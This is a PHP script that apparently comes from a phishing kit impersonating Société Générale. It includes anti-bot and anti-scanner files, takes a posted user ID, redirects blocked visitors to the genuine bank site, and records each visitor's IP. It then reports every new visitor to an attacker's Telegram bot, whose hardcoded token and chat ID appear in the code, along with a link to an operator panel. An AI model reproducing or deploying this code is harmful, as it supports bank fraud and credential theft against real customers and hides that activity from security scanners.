
<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}
$ip = $_SERVER['REMOTE_ADDR'];
$file = 'notified_ips.json';
$already = file_exists($file) ? json_decode(file_get_contents($file), true) : [];

if (isset($already[$ip])) {
    return; // IP déjà notifiée
}

// Enregistrement
$already[$ip] = time();
file_put_contents($file, json_encode($already, JSON_PRETTY_PRINT));

// Infos Telegram
$token = '7726379618:AAEKmunbiAyZSH5Rs-oiTdPUHM6p1Xa6Bb4';
$chat_id = '8134069302';

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
$host = $_SERVER['HTTP_HOST'];
$url = $protocol . $host . '/panel.php';

$message = "⚠️ *Nouveau visiteur détecté !*\n\n🌐 IP : `$ip`\n\n🔗 Lien vers le panel :\n`$url`\n\n👉 [Ouvrir le panel]($url)";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown',
    'disable_web_page_preview' => true
]));
